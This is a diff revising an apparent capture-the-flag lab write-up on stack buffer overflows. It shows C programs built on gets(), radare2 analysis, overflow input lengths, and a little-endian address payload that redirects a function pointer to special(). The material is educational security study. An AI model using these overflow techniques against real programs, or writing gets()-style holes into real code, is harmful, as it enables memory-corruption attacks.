@@ -209,7 +209,7 @@ Least Significant Byte (LSB) → 78
 Understanding Buffer Overflow
 In the program, an integer variable and a character buffer are stored next to each other in memory.
 Because memory is contiguous, writing too much data into the buffer can overwrite the integer variable.
-
+```
 int main(int argc, char **argv)
 {
     volatile int variable = 0;
@@ -223,28 +223,28 @@ int main(int argc, char **argv)
         printf("Try again?\n");
     }
 }
+```
 
-
-Memory Alignment
+## Memory Alignment
 Compilers often align variables to specific boundaries (like 8 or 16 bytes).
 For example, if a 12‑byte array is allocated on a 16‑byte‑aligned stack, the compiler adds 4 bytes of padding to make it fit neatly.
 
-Code
 | buffer (12 bytes) | padding (4 bytes) |
-Stack Frame Example
+
+## Stack Frame Example
 In the main function, the stack frame might look like this:
 
-Code
 | integer variable |
 | character buffer |
+
 Even though the stack grows downward, data written into the buffer moves from lower to higher addresses.
 If too much data is entered, it can overwrite the integer variable.
 
-Why gets() is Dangerous
+## Why gets() is Dangerous
 The gets() function reads input without checking its length.
 If you type more than 14 bytes, the extra data spills over into the integer variable’s memory space — changing its value.
 
-Try It
+## Try It
 Run the program and input more than 14 characters.
 You’ll see that the integer variable’s value changes, demonstrating a buffer overflow.
 
@@ -262,6 +262,7 @@ drwx------ 7 user1 user1  169 Nov 27  2019 ..
 -rwxrwxr-x 1 user1 user1 8224 Sep  2  2019 int-overflow
 -rw-rw-r-- 1 user1 user1  291 Sep  2  2019 int-overflow.c
 ```
+
 Its actually compiled closer look at the file shows its listed as not stripped meaning the debugging information and functions are not removed.
 ```
 [user1@ip-10-49-147-85 overflow-1]$ file int-overflow
@@ -269,7 +270,7 @@ int-overflow: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically l
 [user1@ip-10-49-147-85 overflow-1]$ 
 
 ```
-If not compiled just gun with gcc to compile for c code:
+If not compiled just run with gcc to compile for c code:
 ```
  overflow-1]$ gcc int-overflow.c -o int-overflow
 int-overflow.c: In function \u2018main\u2019:
@@ -280,21 +281,12 @@ int-overflow.c:10:3: warning: implicit declaration of function \u2018gets\u2019;
 /tmp/ccfWv56Q.o: In function `main':
 int-overflow.c:(.text+0x23): warning: the `gets' function is dangerous and should not be used.
 ```
-## 
-A closer look at RADARE2 
 
+## A closer look at RADARE2, then run analysis 'aaa'
 ```
 [user1@ip-10-49-147-85 overflow-1]$ radare2 int-overflow
  -- The Hard ROP Cafe
-[0x00400450]> 
-```
-The Hard ROP Café” is just a fun radare2 startup banner, not an actual exploit technique.
-
-Next start the analysis is 'aaa'
-```
-[user1@ip-10-49-147-85 overflow-1]$ radare2 int-overflow
- -- The Hard ROP Cafe
-[0x00400450]> aaa
+[0x00400450]> aaa  
 [x] Analyze all flags starting with sym. and entry0 (aa)
 [x] Analyze function calls (aac)
 [x] Analyze len bytes of instructions for references (aar)
@@ -305,9 +297,9 @@ Next start the analysis is 'aaa'
 [x] Use -AA or aaaa to perform additional experimental analysis.
 [0x00400450]> 
 ```
+
 Next 'afl' to display the functions:
 ```
-
 [0x00400450]> afl
 0x00400450    1 42           entry0
 0x00400480    4 42   -> 37   sym.deregister_tm_clones
@@ -322,9 +314,9 @@ Next 'afl' to display the functions:
 0x00400430    1 6            sym.imp.puts
 0x00400440    1 6            sym.imp.gets
 [0x00400450]> 
-
 ```
-- View code if desired just wanted to see what error was but its just warning.
+
+View code if desired just wanted to see what error was but its just warning.
 ```
  overflow-1]$ cat int-overflow.c
 #include <stdlib.h>
@@ -345,21 +337,21 @@ int main(int argc, char **argv)
   }
 }
 ```
+
 The variable line 'char buffer[14];' pretty much tells me 14 is going to be the maximum it will handle, try a few sizes anyway.
 14 bytes → Try again?
 8 bytes → Try again?
 32 bytes → Overflow + Segfault - this overwrites the the return address by one byte, 31 avoids it
 15 bytes → Overflow (variable changed)
 
+Example of 14 A's
 ```
 [user1@ip-10-49-129-36 overflow-1]$ ./int-overflow 
 AAAAAAAAAAAAAA
 Try again?
-[user1@ip-10-49-129-36 overflow-1]$ ./int-overflow 
-AAAAAAAA
-Try again?
+...
 ```
-32 and 15 tried
+What 32 or 15 show
 ```
 [user1@ip-10-49-129-36 overflow-1]$ ./int-overflow 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -372,9 +364,9 @@ You have changed the value of the variable
 ```
 
 
-Task 7 Overwriting Function Pointers
+# Task 7 Overwriting Function Pointers
 
-This uses overflow-2 folder, here is part of the C code:
+This uses overflow-2 folder, here is part of the C code used on this task:
 ```
 overflow-2]$ cat func-pointer.c
 #include <stdlib.h>
@@ -405,6 +397,7 @@ int main(int argc, char **argv)
     new_ptr();
 }
 ```
+
 Similar to the example above, data is read into a buffer using the gets function, but the variable above the buffer is not a pointer to a function. A pointer, like its name implies, is used to point to a memory location, and in this case the memory location is that of the normal function. The stack is laid out similar to the example above, but this time you have to find a way of invoking the special function(maybe using the memory address of the function). Try invoke the special function in the program. 
 
 Keep in mind that the architecture of this machine is little endian!
@@ -454,11 +447,9 @@ overflow-2]$ radare2 func-pointer
 0x00400582    1 17           sym.normal
 [0x00400490]> 
 ```
-specail() located at 0x00400567
-As 8‑byte little‑endian:
-67 05 40 00 00 00 00 00
-In a Python string:
-b"\x67\x05\x40\x00\x00\x00\x00\x00"
+sym.special() located at 0x00400567
+As 8‑byte little‑endian: 67 05 40 00 00 00 00 00
+In a Python string: b"\x67\x05\x40\x00\x00\x00\x00\x00"
 
 Option A – inspect main in radare2
 ```
@@ -528,6 +519,7 @@ this is the special function
 you did this, friend!
 ```
 What this does is it fills buffer to limit 14 then fills the location of the variable with the location for special() and it runs
+
 
 # Task 8 Buffer Overflow
 
